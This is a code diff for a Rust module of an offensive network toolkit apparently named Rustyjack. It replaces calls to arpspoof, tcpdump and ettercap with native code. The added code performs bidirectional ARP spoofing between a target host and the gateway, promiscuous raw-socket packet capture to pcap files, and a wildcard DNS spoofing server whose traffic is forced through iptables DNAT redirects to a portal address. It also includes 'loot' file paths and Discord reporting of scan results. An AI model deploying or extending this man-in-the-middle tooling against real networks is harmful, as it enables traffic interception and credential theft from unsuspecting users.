@@ -26,10 +26,19 @@
 //! explicit error messages if not run as root.
 
 use std::{
+    collections::HashMap,
     env, fs,
+    ffi::CString,
+    io::{self, Write},
+    mem,
     net::Ipv4Addr,
+    os::unix::io::RawFd,
     path::{Path, PathBuf},
     process::{Command, Stdio},
+    sync::{
+        atomic::{AtomicBool, Ordering},
+        Arc, Mutex, OnceLock,
+    },
     time::{Duration, SystemTime, UNIX_EPOCH},
 };
 
@@ -38,8 +47,9 @@ use std::os::unix::fs::{OpenOptionsExt, PermissionsExt};
 
 use anyhow::{anyhow, bail, Context, Result};
 use chrono::Local;
+use ipnet::Ipv4Net;
 use log::{debug, info, warn};
-use regex::Regex;
+use rustyjack_netlink::{ArpSpoofConfig, ArpSpoofer, DnsConfig, DnsRule, DnsServer, IptablesManager};
 use reqwest::blocking::{multipart, Client};
 use serde::{Deserialize, Serialize};
 use serde_json::{json, Map, Value};
@@ -311,19 +321,10 @@ pub fn discover_default_interface() -> Result<String> {
     Err(anyhow!("no usable network interface found"))
 }
 
-pub fn strip_nmap_header(path: &Path) -> Result<()> {
-    let contents = fs::read_to_string(path).context("reading nmap output")?;
-    let replaced = contents.replace("Nmap scan report for ", "");
-    if replaced != contents {
-        fs::write(path, replaced).context("writing sanitized nmap output")?;
-    }
-    Ok(())
-}
-
-pub fn build_loot_path(root: &Path, label: &str) -> Result<PathBuf> {
+pub fn build_scan_loot_path(root: &Path, label: &str) -> Result<PathBuf> {
     let safe_label = sanitize_label(label);
     let timestamp = Local::now().format("%Y-%m-%d_%H-%M-%S");
-    let relative = format!("loot/Nmap/{}_{}.txt", safe_label, timestamp);
+    let relative = format!("loot/Scan/{}_{}.txt", safe_label, timestamp);
     Ok(root.join(relative))
 }
 
@@ -366,7 +367,7 @@ pub fn send_scan_to_discord(
         Local::now().format("%Y-%m-%d %H:%M:%S")
     );
     let embed = json!({
-        "title": format!("Nmap Scan Complete: {label}"),
+        "title": format!("Scan Complete: {label}"),
         "description": description,
         "color": 0x00ff00,
         "fields": [{
@@ -378,7 +379,7 @@ pub fn send_scan_to_discord(
             )
         }],
         "footer": {
-            "text": "Rustyjack Nmap Scanner"
+            "text": "Rustyjack Scanner"
         },
         "timestamp": Local::now().to_rfc3339(),
     });
@@ -520,25 +521,14 @@ pub fn process_running_pattern(pattern: &str) -> Result<bool> {
     process_running(pattern).with_context(|| format!("checking for pattern {pattern}"))
 }
 
-pub fn compose_status_text(
-    scan_running: bool,
-    mitm_running: bool,
-    dnsspoof_running: bool,
-    responder_running: bool,
-) -> String {
+pub fn compose_status_text(mitm_running: bool, dnsspoof_running: bool) -> String {
     let mut parts = Vec::new();
 
-    if scan_running {
-        parts.push("Scan");
-    }
     if mitm_running {
         parts.push("MITM");
     }
     if dnsspoof_running {
         parts.push("DNS");
-    }
-    if responder_running {
-        parts.push("Responder");
     }
 
     if parts.is_empty() {
@@ -558,57 +548,99 @@ pub fn default_gateway_ip() -> Result<Ipv4Addr> {
 }
 
 pub fn scan_local_hosts(interface: &str) -> Result<Vec<HostInfo>> {
-    let output = Command::new("arp-scan")
-        .args(["--interface", interface, "--localnet", "--quiet"])
-        .output()
-        .with_context(|| format!("running arp-scan on {interface}"))?;
-    if !output.status.success() {
-        bail!("arp-scan exited with status {}", output.status);
-    }
-    let stdout = String::from_utf8_lossy(&output.stdout);
-    let mut hosts = Vec::new();
-    for line in stdout.lines() {
-        let mut parts = line.split_whitespace();
-        if let (Some(ip_txt), Some(_mac)) = (parts.next(), parts.next()) {
-            if let Ok(ip) = ip_txt.parse() {
-                hosts.push(HostInfo { ip });
-            }
+    let interface_info =
+        detect_interface(Some(interface.to_string())).context("detecting interface for ARP scan")?;
+    let cidr = format!("{}/{}", interface_info.address, interface_info.prefix);
+    let network: Ipv4Net = cidr.parse().context("parsing interface CIDR for ARP scan")?;
+    let rate_limit_pps = Some(50);
+    let timeout = Duration::from_secs(3);
+
+    let result = match tokio::runtime::Handle::try_current() {
+        Ok(handle) => handle.block_on(async {
+            rustyjack_ethernet::discover_hosts_arp(interface, network, rate_limit_pps, timeout)
+                .await
+        }),
+        Err(_) => {
+            let rt = tokio::runtime::Runtime::new()
+                .context("creating tokio runtime for ARP scan")?;
+            rt.block_on(async {
+                rustyjack_ethernet::discover_hosts_arp(interface, network, rate_limit_pps, timeout)
+                    .await
+            })
         }
-    }
-    Ok(hosts)
+    }?;
+
+    Ok(result
+        .hosts
+        .into_iter()
+        .map(|ip| HostInfo { ip })
+        .collect())
 }
 
 pub fn spawn_arpspoof_pair(interface: &str, gateway: Ipv4Addr, host: &HostInfo) -> Result<()> {
-    let gateway_str = gateway.to_string();
-    let host_str = host.ip.to_string();
+    let attacker_mac = read_interface_mac(interface)
+        .and_then(|mac| parse_mac_bytes(&mac).ok())
+        .ok_or_else(|| anyhow!("failed to read MAC for {}", interface))?;
 
-    let mut first = Command::new("arpspoof");
-    first
-        .args(["-i", interface, "-t", &gateway_str, &host_str])
-        .stdout(Stdio::null())
-        .stderr(Stdio::null())
-        .stdin(Stdio::null());
-    first.spawn().with_context(|| {
-        format!(
-            "launching arpspoof against host {} from gateway {}",
-            host.ip, gateway
-        )
-    })?;
+    let mut to_target = ArpSpoofer::new();
+    let mut to_gateway = ArpSpoofer::new();
+    let interval_ms = 1000;
 
-    let mut second = Command::new("arpspoof");
-    second
-        .args(["-i", interface, "-t", &host_str, &gateway_str])
-        .stdout(Stdio::null())
-        .stderr(Stdio::null())
-        .stdin(Stdio::null());
-    second.spawn().with_context(|| {
-        format!(
-            "launching arpspoof against gateway {} from host {}",
-            gateway, host.ip
-        )
-    })?;
+    to_target
+        .start_continuous(ArpSpoofConfig {
+            target_ip: host.ip,
+            spoof_ip: gateway,
+            attacker_mac,
+            interface: interface.to_string(),
+            interval_ms,
+            restore_on_stop: true,
+        })
+        .with_context(|| {
+            format!(
+                "starting ARP spoof against host {} from gateway {}",
+                host.ip, gateway
+            )
+        })?;
+
+    to_gateway
+        .start_continuous(ArpSpoofConfig {
+            target_ip: gateway,
+            spoof_ip: host.ip,
+            attacker_mac,
+            interface: interface.to_string(),
+            interval_ms,
+            restore_on_stop: true,
+        })
+        .with_context(|| {
+            format!(
+                "starting ARP spoof against gateway {} from host {}",
+                gateway, host.ip
+            )
+        })?;
+
+    let mut state = arp_spoof_state().lock().unwrap();
+    state.push(ArpSpoofHandle {
+        interface: interface.to_string(),
+        target_ip: host.ip,
+        gateway_ip: gateway,
+        spoofers: vec![to_target, to_gateway],
+    });
 
     Ok(())
+}
+
+fn parse_mac_bytes(input: &str) -> Result<[u8; 6]> {
+    let cleaned = input.trim();
+    let parts: Vec<&str> = cleaned.split(':').collect();
+    if parts.len() != 6 {
+        bail!("invalid MAC address format: {}", input);
+    }
+    let mut mac = [0u8; 6];
+    for (idx, part) in parts.iter().enumerate() {
+        mac[idx] = u8::from_str_radix(part, 16)
+            .with_context(|| format!("invalid MAC octet {}", part))?;
+    }
+    Ok(mac)
 }
 
 pub fn build_mitm_pcap_path(root: &Path, target: Option<&str>) -> Result<PathBuf> {
@@ -619,16 +651,278 @@ pub fn build_mitm_pcap_path(root: &Path, target: Option<&str>) -> Result<PathBuf
     Ok(dir.join(format!("mitm_{timestamp}.pcap")))
 }
 
-pub fn start_tcpdump_capture(interface: &str, path: &Path) -> Result<()> {
-    let path_str = path.to_string_lossy().to_string();
-    let mut cmd = Command::new("tcpdump");
-    cmd.args(["-i", interface, "-w", &path_str])
-        .stdout(Stdio::null())
-        .stderr(Stdio::null())
-        .stdin(Stdio::null());
-    cmd.spawn()
-        .with_context(|| format!("launching tcpdump on {interface}"))?;
+const PCAP_MAGIC: u32 = 0xa1b2c3d4;
+const PCAP_VERSION_MAJOR: u16 = 2;
+const PCAP_VERSION_MINOR: u16 = 4;
+const PCAP_LINKTYPE_ETHERNET: u32 = 1;
+const PCAP_SNAPLEN: u32 = 262144;
+
+struct CaptureHandle {
+    stop: Arc<AtomicBool>,
+    running: Arc<AtomicBool>,
+    thread: std::thread::JoinHandle<()>,
+}
+
+static PCAP_CAPTURE: OnceLock<Mutex<Option<CaptureHandle>>> = OnceLock::new();
+
+fn capture_state() -> &'static Mutex<Option<CaptureHandle>> {
+    PCAP_CAPTURE.get_or_init(|| Mutex::new(None))
+}
+
+pub fn pcap_capture_running() -> bool {
+    let mut state = capture_state().lock().unwrap();
+    if let Some(handle) = state.as_ref() {
+        if handle.thread.is_finished() {
+            let handle = state.take();
+            if let Some(handle) = handle {
+                let _ = handle.thread.join();
+            }
+            return false;
+        }
+    }
+    if let Some(handle) = state.as_ref() {
+        if handle.running.load(Ordering::Relaxed) {
+            return true;
+        }
+    }
+    false
+}
+
+pub fn stop_pcap_capture() -> Result<()> {
+    let handle = {
+        let mut state = capture_state().lock().unwrap();
+        state.take()
+    };
+    if let Some(handle) = handle {
+        handle.stop.store(true, Ordering::SeqCst);
+        let _ = handle.thread.join();
+    }
     Ok(())
+}
+
+pub fn start_pcap_capture(interface: &str, path: &Path) -> Result<()> {
+    let _ = stop_pcap_capture();
+
+    let fd = open_packet_socket(interface)?;
+    let file = fs::OpenOptions::new()
+        .create(true)
+        .write(true)
+        .truncate(true)
+        .open(path)
+        .with_context(|| format!("opening pcap file {}", path.display()))?;
+    let writer = PcapWriter::new(io::BufWriter::new(file), PCAP_SNAPLEN)
+        .context("writing pcap header")?;
+
+    let stop = Arc::new(AtomicBool::new(false));
+    let running = Arc::new(AtomicBool::new(true));
+    let stop_thread = Arc::clone(&stop);
+    let running_thread = Arc::clone(&running);
+    let interface_name = interface.to_string();
+    let path_display = path.display().to_string();
+
+    let thread = std::thread::spawn(move || {
+        if let Err(err) = run_pcap_capture(fd, writer, stop_thread, running_thread) {
+            log::error!("[PCAP] capture failed on {}: {}", interface_name, err);
+        }
+        log::info!("[PCAP] capture stopped on {} -> {}", interface_name, path_display);
+    });
+
+    let mut state = capture_state().lock().unwrap();
+    *state = Some(CaptureHandle {
+        stop,
+        running,
+        thread,
+    });
+    log::info!("[PCAP] capture started on {} -> {}", interface, path.display());
+    Ok(())
+}
+
+struct PcapWriter<W: Write> {
+    writer: W,
+}
+
+impl<W: Write> PcapWriter<W> {
+    fn new(mut writer: W, snaplen: u32) -> io::Result<Self> {
+        writer.write_all(&PCAP_MAGIC.to_le_bytes())?;
+        writer.write_all(&PCAP_VERSION_MAJOR.to_le_bytes())?;
+        writer.write_all(&PCAP_VERSION_MINOR.to_le_bytes())?;
+        writer.write_all(&0i32.to_le_bytes())?;
+        writer.write_all(&0u32.to_le_bytes())?;
+        writer.write_all(&snaplen.to_le_bytes())?;
+        writer.write_all(&PCAP_LINKTYPE_ETHERNET.to_le_bytes())?;
+        Ok(Self { writer })
+    }
+
+    fn write_packet(&mut self, ts_sec: u32, ts_usec: u32, data: &[u8]) -> io::Result<()> {
+        let len = data.len() as u32;
+        self.writer.write_all(&ts_sec.to_le_bytes())?;
+        self.writer.write_all(&ts_usec.to_le_bytes())?;
+        self.writer.write_all(&len.to_le_bytes())?;
+        self.writer.write_all(&len.to_le_bytes())?;
+        self.writer.write_all(data)?;
+        Ok(())
+    }
+
+    fn flush(&mut self) -> io::Result<()> {
+        self.writer.flush()
+    }
+}
+
+struct FdGuard(RawFd);
+
+impl Drop for FdGuard {
+    fn drop(&mut self) {
+        unsafe {
+            libc::close(self.0);
+        }
+    }
+}
+
+fn open_packet_socket(interface: &str) -> Result<RawFd> {
+    let ifname = CString::new(interface).context("interface name contains null byte")?;
+    let ifindex = unsafe { libc::if_nametoindex(ifname.as_ptr()) };
+    if ifindex == 0 {
+        return Err(anyhow!("failed to resolve ifindex for {}", interface));
+    }
+
+    let fd = unsafe {
+        libc::socket(
+            libc::AF_PACKET,
+            libc::SOCK_RAW,
+            (libc::ETH_P_ALL as u16).to_be() as i32,
+        )
+    };
+    if fd < 0 {
+        return Err(io::Error::last_os_error()).context("creating packet socket");
+    }
+
+    let sll = libc::sockaddr_ll {
+        sll_family: libc::AF_PACKET as u16,
+        sll_protocol: (libc::ETH_P_ALL as u16).to_be(),
+        sll_ifindex: ifindex as i32,
+        sll_hatype: 0,
+        sll_pkttype: 0,
+        sll_halen: 0,
+        sll_addr: [0; 8],
+    };
+    let bind_res = unsafe {
+        libc::bind(
+            fd,
+            &sll as *const libc::sockaddr_ll as *const libc::sockaddr,
+            mem::size_of::<libc::sockaddr_ll>() as u32,
+        )
+    };
+    if bind_res != 0 {
+        let err = io::Error::last_os_error();
+        unsafe { libc::close(fd) };
+        return Err(err).context("binding packet socket");
+    }
+
+    if let Err(err) = set_promiscuous(fd, ifindex as i32) {
+        log::warn!(
+            "[PCAP] failed to set promiscuous mode on {}: {}",
+            interface,
+            err
+        );
+    }
+
+    let flags = unsafe { libc::fcntl(fd, libc::F_GETFL) };
+    if flags >= 0 {
+        let _ = unsafe { libc::fcntl(fd, libc::F_SETFL, flags | libc::O_NONBLOCK) };
+    }
+
+    Ok(fd)
+}
+
+fn set_promiscuous(fd: RawFd, ifindex: i32) -> Result<()> {
+    let mut mreq = libc::packet_mreq {
+        mr_ifindex: ifindex,
+        mr_type: libc::PACKET_MR_PROMISC as u16,
+        mr_alen: 0,
+        mr_address: [0; 8],
+    };
+    let res = unsafe {
+        libc::setsockopt(
+            fd,
+            libc::SOL_PACKET,
+            libc::PACKET_ADD_MEMBERSHIP,
+            &mut mreq as *mut libc::packet_mreq as *mut libc::c_void,
+            mem::size_of::<libc::packet_mreq>() as u32,
+        )
+    };
+    if res != 0 {
+        return Err(io::Error::last_os_error()).context("setting promiscuous mode");
+    }
+    Ok(())
+}
+
+fn run_pcap_capture(
+    fd: RawFd,
+    mut writer: PcapWriter<io::BufWriter<fs::File>>,
+    stop: Arc<AtomicBool>,
+    running: Arc<AtomicBool>,
+) -> Result<()> {
+    let _guard = FdGuard(fd);
+    let mut buf = vec![0u8; PCAP_SNAPLEN as usize];
+    let mut pollfd = libc::pollfd {
+        fd,
+        events: libc::POLLIN,
+        revents: 0,
+    };
+
+    let result = (|| {
+        while !stop.load(Ordering::Relaxed) {
+            pollfd.revents = 0;
+            let res = unsafe { libc::poll(&mut pollfd, 1, 500) };
+            if res < 0 {
+                let err = io::Error::last_os_error();
+                if err.kind() == io::ErrorKind::Interrupted {
+                    continue;
+                }
+                return Err(err).context("polling packet socket");
+            }
+            if res == 0 {
+                continue;
+            }
+            if pollfd.revents & libc::POLLIN == 0 {
+                continue;
+            }
+
+            let n = unsafe {
+                libc::recv(
+                    fd,
+                    buf.as_mut_ptr() as *mut libc::c_void,
+                    buf.len(),
+                    0,
+                )
+            };
+            if n < 0 {
+                let err = io::Error::last_os_error();
+                if err.kind() == io::ErrorKind::WouldBlock {
+                    continue;
+                }
+                return Err(err).context("receiving packet");
+            }
+
+            let now = SystemTime::now()
+                .duration_since(UNIX_EPOCH)
+                .unwrap_or_default();
+            let ts_sec = now.as_secs().min(u64::from(u32::MAX)) as u32;
+            let ts_usec = now.subsec_micros();
+            let size = n as usize;
+            if size > 0 {
+                writer
+                    .write_packet(ts_sec, ts_usec, &buf[..size])
+                    .context("writing pcap packet")?;
+            }
+        }
+
+        writer.flush().context("flushing pcap writer")?;
+        Ok(())
+    })();
+
+    running.store(false, Ordering::Relaxed);
+    result
 }
 
 pub fn enable_ip_forwarding(enabled: bool) -> Result<()> {
@@ -638,13 +932,115 @@ pub fn enable_ip_forwarding(enabled: bool) -> Result<()> {
     Ok(())
 }
 
-pub fn rewrite_ettercap_dns(ip: Ipv4Addr) -> Result<()> {
-    let path = Path::new("/etc/ettercap/etter.dns");
-    let contents = fs::read_to_string(path).context("reading etter.dns")?;
-    let regex =
-        Regex::new(r"\b\d{1,3}(?:\.\d{1,3}){3}\b").context("compiling IPv4 regex for etter.dns")?;
-    let replacement = regex.replace_all(&contents, ip.to_string());
-    fs::write(path, replacement.as_bytes()).context("writing updated etter.dns")?;
+struct DnsSpoofHandle {
+    server: DnsServer,
+    interface: String,
+    listen_ip: Ipv4Addr,
+}
+
+struct ArpSpoofHandle {
+    interface: String,
+    target_ip: Ipv4Addr,
+    gateway_ip: Ipv4Addr,
+    spoofers: Vec<ArpSpoofer>,
+}
+
+static ARP_SPOOFERS: OnceLock<Mutex<Vec<ArpSpoofHandle>>> = OnceLock::new();
+
+fn arp_spoof_state() -> &'static Mutex<Vec<ArpSpoofHandle>> {
+    ARP_SPOOFERS.get_or_init(|| Mutex::new(Vec::new()))
+}
+
+pub fn arp_spoof_running() -> bool {
+    let mut state = arp_spoof_state().lock().unwrap();
+    state.retain(|handle| handle.spoofers.iter().any(|s| s.is_running()));
+    !state.is_empty()
+}
+
+pub fn stop_arp_spoof() -> Result<()> {
+    let mut state = arp_spoof_state().lock().unwrap();
+    for handle in state.drain(..) {
+        for mut spoofer in handle.spoofers {
+            spoofer.stop();
+        }
+    }
+    Ok(())
+}
+
+static DNS_SPOOF: OnceLock<Mutex<Option<DnsSpoofHandle>>> = OnceLock::new();
+
+fn dns_spoof_state() -> &'static Mutex<Option<DnsSpoofHandle>> {
+    DNS_SPOOF.get_or_init(|| Mutex::new(None))
+}
+
+pub fn dns_spoof_running() -> bool {
+    let mut state = dns_spoof_state().lock().unwrap();
+    if let Some(handle) = state.as_ref() {
+        if handle.server.is_running() {
+            return true;
+        }
+    }
+    if state.is_some() {
+        let _ = state.take();
+    }
+    false
+}
+
+pub fn start_dns_spoof(interface: &str, listen_ip: Ipv4Addr, portal_ip: Ipv4Addr) -> Result<()> {
+    let _ = stop_dns_spoof();
+    let config = DnsConfig {
+        interface: interface.to_string(),
+        listen_ip,
+        default_rule: DnsRule::WildcardSpoof(portal_ip),
+        custom_rules: HashMap::new(),
+        upstream_dns: None,
+        log_queries: true,
+    };
+
+    let mut server = DnsServer::new(config)
+        .with_context(|| format!("creating DNS spoof server on {}", interface))?;
+    server
+        .start()
+        .with_context(|| format!("starting DNS spoof server on {}", interface))?;
+
+    let ipt = IptablesManager::new().context("initializing netfilter for DNS spoof")?;
+    let listen = listen_ip.to_string();
+    if let Err(err) = ipt
+        .add_dnat_udp(interface, 53, &listen, 53)
+        .context("adding UDP DNS redirect")
+        .and_then(|_| ipt.add_dnat(interface, 53, &listen, 53).context("adding TCP DNS redirect"))
+    {
+        let _ = server.stop();
+        return Err(err);
+    }
+
+    let mut state = dns_spoof_state().lock().unwrap();
+    *state = Some(DnsSpoofHandle {
+        server,
+        interface: interface.to_string(),
+        listen_ip,
+    });
+    Ok(())
+}
+
+pub fn stop_dns_spoof() -> Result<()> {
+    let handle = {
+        let mut state = dns_spoof_state().lock().unwrap();
+        state.take()
+    };
+
+    if let Some(mut handle) = handle {
+        if let Ok(ipt) = IptablesManager::new() {
+            let listen = handle.listen_ip.to_string();
+            let _ = ipt.delete_dnat_udp(&handle.interface, 53, &listen, 53);
+            let _ = ipt.delete_dnat(&handle.interface, 53, &listen, 53);
+        }
+        handle
+            .server
+            .stop()
+            .with_context(|| format!("stopping DNS spoof on {}", handle.interface))?;
+    }
+
     Ok(())
 }
 
@@ -660,25 +1056,6 @@ pub fn start_php_server(site_dir: &Path, loot_dir: Option<&Path>) -> Result<()> 
     }
     cmd.spawn()
         .with_context(|| format!("launching PHP server in {}", site_dir.display()))?;
-    Ok(())
-}
-
-pub fn start_ettercap(interface: &str) -> Result<()> {
-    let mut cmd = Command::new("ettercap");
-    cmd.args([
-        "-Tq",
-        "-M",
-        "arp:remote",
-        "-P",
-        "dns_spoof",
-        "-i",
-        interface,
-    ])
-    .stdout(Stdio::null())
-    .stderr(Stdio::null())
-    .stdin(Stdio::null());
-    cmd.spawn()
-        .with_context(|| format!("starting ettercap on {interface}"))?;
     Ok(())
 }
 
